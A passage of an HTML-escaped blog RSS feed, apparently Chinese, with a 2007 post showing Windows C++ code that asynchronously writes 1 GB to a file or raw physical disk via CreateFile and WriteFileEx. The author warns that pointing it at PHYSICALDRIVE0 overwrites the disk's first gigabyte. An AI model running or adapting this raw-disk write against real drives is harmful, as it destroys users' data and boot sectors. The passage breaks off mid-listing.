&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;AdjustTokenPrivileges&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hToken&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;tkp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nf"&gt;CloseHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hToken&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nf"&gt;CloseHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description></item><item><title>Windows NT以上系统异步读写硬盘的方法</title><link>https://blogs.qipai360.cn/post/windows-nt-async-hard-disk-access-method/</link><pubDate>Wed, 23 May 2007 17:59:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/windows-nt-async-hard-disk-access-method/</guid><description>&lt;P&gt;今日整理硬盘无意发现刚学windows编程时写的一段代码,用于在windows下异步读写硬盘用的.&lt;BR&gt;可能网上已经有类似的代码了,小弟在发一次,希望别有人用这做坏事.&lt;BR&gt;打开硬盘有两个东西要知道,第一打开的文件名:\\\\.\\PHYSICALDRIVE0, 0代表第一块硬盘,依次1代表第二块硬盘...第二打开硬盘使用的参数OPEN_EXISTING是不可少的,至于为什么查MSDN.&lt;BR&gt;先把代码发上来大家看看,读写速度还可以几秒就1G了,有空改成完成端口不知道会不会快点.&lt;BR&gt;&lt;FONT color=#ff1493&gt;(注意以下代码不要用&lt;/FONT&gt;&lt;A&gt;&lt;FONT color=#ff1493&gt;\\\\.\\PHYSICALDRIVE0&lt;/FONT&gt;&lt;/A&gt;&lt;FONT color=#ff1493&gt;试验,会把硬盘时的第一个G内容写成0,后果可想而知)&lt;/FONT&gt;&lt;/P&gt;
&lt;DIV style="BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 4px; FONT-SIZE: 13px; PADDING-BOTTOM: 4px; BORDER-LEFT: #cccccc 1px solid; WIDTH: 98%; WORD-BREAK: break-all; PADDING-TOP: 4px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #eeeeee"&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;1&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;#include&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;lt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;Windows.h&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;2&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;3&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;VOID&amp;nbsp;CALLBACK&amp;nbsp;MyIOCompletion(DWORD&amp;nbsp;dwErrorCode,&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;4&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DWORD&amp;nbsp;dwNumberOfBytesTransfered,&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;5&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;LPOVERLAPPED&amp;nbsp;lpOverlapped&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;6&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;7&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;8&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;BOOL&amp;nbsp;ReadHardDisk(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;char&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;disk);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;9&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;10&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;int&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;__stdcall&amp;nbsp;WinMain(IN&amp;nbsp;HINSTANCE&amp;nbsp;hInstance,&amp;nbsp;IN&amp;nbsp;HINSTANCE&amp;nbsp;hPrevInstance,&amp;nbsp;IN&amp;nbsp;LPSTR&amp;nbsp;lpCmdLine,&amp;nbsp;IN&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;int&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;nShowCmd&amp;nbsp;)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;11&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;12&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;ReadHardDisk("\\\\.\\PHYSICALDRIVE0");&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;13&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ReadHardDisk(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;"&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;C:\\a.dat&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;"&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&amp;nbsp;如果要试试,先建立文件,要不会出错&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;14&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;15&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;16&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;17&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;return&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;18&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;19&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;20&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;VOID&amp;nbsp;CALLBACK&amp;nbsp;MyIOCompletion(DWORD&amp;nbsp;dwErrorCode,&amp;nbsp;DWORD&amp;nbsp;dwNumberOfBytesTransfered,&amp;nbsp;LPOVERLAPPED&amp;nbsp;lpOverlapped&amp;nbsp;)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;21&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;22&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;TRACE("write&amp;nbsp;disk&amp;nbsp;succeed.");&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;23&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;24&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;25&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;BOOL&amp;nbsp;ReadHardDisk(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;char&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;disk)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;26&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;27&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;HANDLE&amp;nbsp;hHead;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;28&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;29&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hHead&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;CreateFile(disk,&amp;nbsp;GENERIC_WRITE,&amp;nbsp;FILE_SHARE_WRITE,&amp;nbsp;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;30&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;NULL,&amp;nbsp;OPEN_EXISTING,&amp;nbsp;FILE_FLAG_OVERLAPPED,&amp;nbsp;NULL);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;31&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;(INVALID_HANDLE_VALUE&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;==&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;hHead)&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;32&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;33&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;return&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;FALSE;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;34&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;35&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;36&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;BYTE&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;pbWrite&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;new&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;BYTE[&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;];&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&amp;nbsp;1M&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;37&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;OVERLAPPED&amp;nbsp;overlap;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;38&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;39&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;40&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;for&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;int&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;i&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;;&amp;nbsp;i&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;lt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;;&amp;nbsp;i&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;++&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&amp;nbsp;1024&amp;nbsp;也就是&amp;nbsp;1G&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;41&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;42&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;overlap.Offset&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;i;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;43&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;overlap.OffsetHigh&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;44&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;overlap.hEvent&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;NULL;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;45&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;WriteFileEx(hHead,&amp;nbsp;pbWrite,&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;*&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1024&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;overlap,&amp;nbsp;MyIOCompletion);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;46&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;while&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(WAIT_IO_COMPLETION&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;SleepEx(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,&amp;nbsp;TRUE))&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&amp;nbsp;在这里可能加点东西做点别的事情&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;47&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;48&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Sleep(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;0&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;//&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&amp;nbsp;切换下时钟&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;49&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #008000"&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;50&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: 